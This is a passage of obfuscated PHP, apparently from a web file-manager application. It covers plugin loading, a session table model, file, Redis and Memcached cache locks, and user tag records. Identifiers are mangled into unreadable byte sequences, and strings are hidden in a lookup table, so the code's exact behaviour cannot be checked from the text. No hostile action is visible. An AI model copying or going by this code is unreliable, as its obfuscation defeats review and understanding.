$this->pluginScan($a‘¡ÛÎÅè); goto a¤ÇÆ¤¤Œ; DŠ¥›ÄÓ–: } private function loadPluginList() { $C‚¼ç£ö„¦ =& $_SERVER[£¶ä½¶¢]; $C©å’·Ä°ô = $this->loadList(); if (strtolower(MOD) == $C‚¼ç£ö„¦[1811]) { return $C©å’·Ä°ô; } $dğŒ˜†Ô“Œ = Hook::trigger($C‚¼ç£ö„¦[1812], $C©å’·Ä°ô); if ($C©å’·Ä°ô && !$dğŒ˜†Ô“Œ) { die; } return $dğŒ˜†Ô“Œ ? $dğŒ˜†Ô“Œ : $C©å’·Ä°ô; } private function pluginScan($fÍĞäÈ†ï¡) { $f‡ôÛñ‚¡® =& $_SERVER[£¶ä½¶¢]; recursion_dir(PLUGIN_DIR, $eÊùÒ¢¿ğ‹, $AÚèÁò¾‚, 0); foreach ($eÊùÒ¢¿ğ‹ as $a‰ƒÚœ«ó) { $F»‘˜ÊÌÀÊ = get_path_this($a‰ƒÚœ«ó); if (isset($fÍĞäÈ†ï¡[$F»‘˜ÊÌÀÊ]) || !file_exists($a‰ƒÚœ«ó . $f‡ôÛñ‚¡®[1813]) || !file_exists($a‰ƒÚœ«ó . $f‡ôÛñ‚¡®[1804])) { continue; } Hook::apply($F»‘˜ÊÌÀÊ . $f‡ôÛñ‚¡®[1807]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\x73\164\x65\x6d\137\163\x65\163\x73\x69\157\156"; public function get($d¦…ªŠËê) { $A‰ƒÚ³¦É‚ =& $_SERVER[£¶ä½¶¢]; $Fê¶•ÚÂáÏ = $this->where(array($A‰ƒÚ³¦É‚[1814] => $d¦…ªŠËê))->find(); if (!is_array($Fê¶•ÚÂáÏ)) { return !1; } return $Fê¶•ÚÂáÏ[$A‰ƒÚ³¦É‚[723]]; } public function set($Dˆ‚˜‰Ú‚‚, $CöÃŸ™ğé, $D²Éæ”®Œ = 3600) { $D‘²š¤”Áš =& $_SERVER[£¶ä½¶¢]; $eÅñ‹„Ëáİ = array($D‘²š¤”Áš[1814] => $Dˆ‚˜‰Ú‚‚, $D‘²š¤”Áš[1723] => $CöÃŸ™ğé, $D‘²š¤”Áš[1815] => $D²Éæ”®Œ + time()); if (Session::get($D‘²š¤”Áš[1816])) { $eÅñ‹„Ëáİ[$D‘²š¤”Áš[1526]] = Session::get($D‘²š¤”Áš[1816]); } else { $eÅñ‹„Ëáİ[$D‘²š¤”Áš[1526]] = 0; } if ($this->get($Dˆ‚˜‰Ú‚‚)) { return $this->where(array($D‘²š¤”Áš[1814] => $Dˆ‚˜‰Ú‚‚))->save($eÅñ‹„Ëáİ); } else { return $this->add($eÅñ‹„Ëáİ, array(), !0); } } public function remove($C•ã—ùÚõè) { return $this->where(array($_SERVER[£¶ä½¶¢][1814] => $C•ã—ùÚõè))->delete(); } public function clearTimeout() { return $this->where($_SERVER[£¶ä½¶¢][1817] . time())->delete(); } } goto C³†Ïô—®†; E¸Ûßİ¶ê: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $d÷ÛŸ“ß¡ =& $_SERVER[£¶ä½¶¢]; $Fß‚òÇää = $GLOBALS[$d÷ÛŸ“ß¡[16]][$d÷ÛŸ“ß¡[356]]; self::$cachePath = $Fß‚òÇää[$d÷ÛŸ“ß¡[203]][$d÷ÛŸ“ß¡[86]]; @mkdir(self::$cachePath, 511, !0); } public function lock($a¸¹­¨‘å», $E¢èÛâğ ÷ = 0) { goto d¹é¨æ£‚ç; d¹é¨æ£‚ç: $DìÅâÙÔö =& $_SERVER[£¶ä½¶¢]; $f¸áµª‚¦¨ = microtime(!0); $E‰Ç•Ÿ­ = $f¸áµª‚¦¨ + $E¢èÛâğ ÷ + 0.0001; goto A®ÎÆ¨ù¾³; C¼…³ˆËÔ“: $this->unlock($a¸¹­¨‘å»); return !1; goto BŠ¢Ñ÷«¿¾; A®ÎÆ¨ù¾³: $CÅ‰¿Û„ô = rtrim(self::$cachePath, $DìÅâÙÔö[18]) . $DìÅâÙÔö[826] . md5($a¸¹­¨‘å») . $DìÅâÙÔö[823]; if (file_exists($CÅ‰¿Û„ô) && filemtime($CÅ‰¿Û„ô) && filemtime($CÅ‰¿Û„ô) < time() - 10) { @unlink($CÅ‰¿Û„ô); } do { if (file_exists($CÅ‰¿Û„ô)) { cacheLockWait(); continue; } $fé§Î®ôí = fopen($CÅ‰¿Û„ô, $DìÅâÙÔö[827]); if (!$fé§Î®ôí) { return !1; } $B’¢ÑÏ®¤ = flock($fé§Î®ôí, LOCK_EX | LOCK_NB); self::$caches[$a¸¹­¨‘å»] = array($DìÅâÙÔö[828] => $fé§Î®ôí, $DìÅâÙÔö[203] => $CÅ‰¿Û„ô); fwrite($fé§Î®ôí, $E‰Ç•Ÿ­); clearstatcache(); if ($fé§Î®ôí && $B’¢ÑÏ®¤) { return !0; } cacheLockWait(); } while (microtime(!0) < $E‰Ç•Ÿ­); goto C¼…³ˆËÔ“; BŠ¢Ñ÷«¿¾: } public function lockGet($cØ»£ñµ) { $aØ†ê‰ÅŠË =& $_SERVER[£¶ä½¶¢]; $Eæ‹î¸äÂè = rtrim(self::$cachePath, $aØ†ê‰ÅŠË[18]) . $aØ†ê‰ÅŠË[826] . md5($cØ»£ñµ) . $aØ†ê‰ÅŠË[823]; return file_exists($Eæ‹î¸äÂè); } public function unlock($AéëÆŸçˆË) { goto B‡ùª»®Â; B§…Ãºº¤: @flock($F ´ôÆ£æå[$föÇ¦ğïĞß[828]], LOCK_UN); @fclose($F ´ôÆ£æå[$föÇ¦ğïĞß[828]]); @unlink($F ´ôÆ£æå[$föÇ¦ğïĞß[203]]); goto bø±ØÔ‡×Ø; B‡ùª»®Â: $föÇ¦ğïĞß =& $_SERVER[£¶ä½¶¢]; $F ´ôÆ£æå = self::$caches[$AéëÆŸçˆË]; if (!$F ´ôÆ£æå) { return; } goto B§…Ãºº¤; bø±ØÔ‡×Ø: unset(self::$caches[$AéëÆŸçˆË]); goto a”Ñ¥ÂÆ‹í; a”Ñ¥ÂÆ‹í: } } class CacheLockRedis { public function lock($eæ™–à±¹, $cğÒ˜ËÅ – = 10) { $C§¾‰Çº×Ï = Cache::init(); $Fè¯Ø‚¦¯Š = microtime(!0) + $cğÒ˜ËÅ –; while (microtime(!0) < $Fè¯Ø‚¦¯Š) { $cÓåÍğ†˜ = $C§¾‰Çº×Ï->get($eæ™–à±¹); if (!$cÓåÍğ†˜) { $CÈ·šÂº¸À = $C§¾‰Çº×Ï->setLock($eæ™–à±¹, $Fè¯Ø‚¦¯Š, $cğÒ˜ËÅ –); if ($CÈ·šÂº¸À) { return !0; } } else { if ($cÓåÍğ†˜ < microtime(!0)) { $C§¾‰Çº×Ï->set($eæ™–à±¹, $Fè¯Ø‚¦¯Š, $cğÒ˜ËÅ – * 2); if ($C§¾‰Çº×Ï->get($eæ™–à±¹) === $cÓåÍğ†˜) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($F¼ó—õ¬ê) { return Cache::init()->get($F¼ó—õ¬ê); } public function unlock($A±ĞãˆŠÙŠ) { return Cache::init()->remove($A±ĞãˆŠÙŠ); } } class CacheLockMemcached { public function lock($Dª²•˜ä¹¢, $D—ôÂí—Ö¾ = 0) { $aî©ÂØ±³„ = Cache::init(); $dİË£Î§·¯ = microtime(!0) + $D—ôÂí—Ö¾; while (microtime(!0) < $dİË£Î§·¯) { $c„Òº‰çĞù = $aî©ÂØ±³„->get($Dª²•˜ä¹¢); if (!$c„Òº‰çĞù || $c„Òº‰çĞù < microtime(!0)) { $e£©ù›ùœ = $aî©ÂØ±³„->handle->add($Dª²•˜ä¹¢, $dİË£Î§·¯, $D—ôÂí—Ö¾); if ($e£©ù›ùœ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Aåæà¸¼µ) { return Cache::init()->get($Aåæà¸¼µ); } public function unlock($B®ØÍÜŞÙÈ) { return Cache::init()->remove($B®ØÍÜŞÙÈ); } } goto f«ÙÑİôÎ; B‹ê¢¤ç¤Ô: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\x65\x72\137\146\x61\x76"; protected function cacheFunctionAlias($f‹ç’ŒŒË¸) { $f­±Éåõåª =& $_SERVER[£¶ä½¶¢]; return array($f­±Éåõåª[1792] => array(USER_ID, $f­±Éåõåª[1793])); } protected function listData() { $c´Ô«Ã¢ˆ =& $_SERVER[£¶ä½¶¢]; $cíºÂõƒª« = array($c´Ô«Ã¢ˆ[1518] => USER_ID, $c´Ô«Ã¢ˆ[471] => array($c´Ô«Ã¢ˆ[1796], 0)); $EÒïåƒÎ¯„ = $c´Ô«Ã¢ˆ[1798]; $a‘¾‘ë„İ‹ = $this->field($EÒïåƒÎ¯„)->where($cíºÂõƒª«)->order($c´Ô«Ã¢ˆ[1799])->select(); return $a‘¾‘ë„İ‹ ? $a‘¾‘ë„İ‹ : array(); } protected function listByTag($cÏùÅ¸âÜí) { } protected function addToTag($AÖï©ùã¤†, $eƒ£‡é¢øó) { $FÖãáèº„é =& $_SERVER[£¶ä½¶¢]; if (!Model($FÖãáèº„é[1934])->listData($eƒ£‡é¢øó) || !Model($FÖãáèº„é[798])->pathInfo($AÖï©ùã¤†)) { return !1; } $CºæŒŞè¿æ = array($FÖãáèº„é[1518] => USER_ID, $FÖãáèº„é[471] => $eƒ£‡é¢øó, $FÖãáèº„é[422] => $AÖï©ùã¤†, $FÖãáèº„é[423] => $FÖãáèº„é[417], $FÖãáèº„é[421] => $FÖãáèº„é[43], $FÖãáèº„é[1694] => 0); if ($this->where($CºæŒŞè¿æ)->find()) { return !1; } return $this->add($CºæŒŞè¿æ); } protected function removeFromTag($c®ÙŠ…Äøæ, $eº„¥º°à†) { $C»¦…ööàÔ =& $_SERVER[£¶ä½¶¢]; if (!Model($C»¦…ööàÔ[1934])->listData($eº„¥º°à†)) { return !1; } if (is_array($c®ÙŠ…Äøæ)) { $c®ÙŠ…Äøæ = array($C»¦…ööàÔ[17], $c®ÙŠ…Äøæ); } $dÌƒ¢¯’¦ñ = array($C»¦…ööàÔ[1518] => USER_ID, $C»¦…ööàÔ[471] => $eº„¥º°à†, $C»¦…ööàÔ[423] => $C»¦…ööàÔ[417], $C»¦…ööàÔ[422] => $c®ÙŠ…Äøæ); return $this->where($dÌƒ¢¯’¦ñ)->delete(); } protected function removeByTag($c­õõÕÜ²‘) { $dƒ–àà¿» =& $_SERVER[£¶ä½¶¢]; if (!$c­õõÕÜ²‘) { return !1; } $F­çŞ³ªŒË = array($dƒ–àà¿»[1518] => USER_ID, $dƒ–àà¿»[471] => $c­õõÕÜ²‘); return $this->where($F­çŞ³ªŒË)->delete(); } protected function removeBySource($b…½É®£Ì) { $A‘Ïò´„ñà =& $_SERVER[£¶ä½¶¢]; if (is_array($b…½É®£Ì)) { $b…½É®£Ì = array($A‘Ïò´„ñà[17], $b…½É®£Ì); } $cÖ‘ñÄ®Úˆ = array($A‘Ïò´„ñà[1518] => USER_ID, $A‘Ïò´„ñà[422] => $b…½É®£Ì, $A‘Ïò´„ñà[471] => array($A‘Ïò´„ñà[969], 0)); return $this->where($cÖ‘ñÄ®Úˆ)->delete(); } }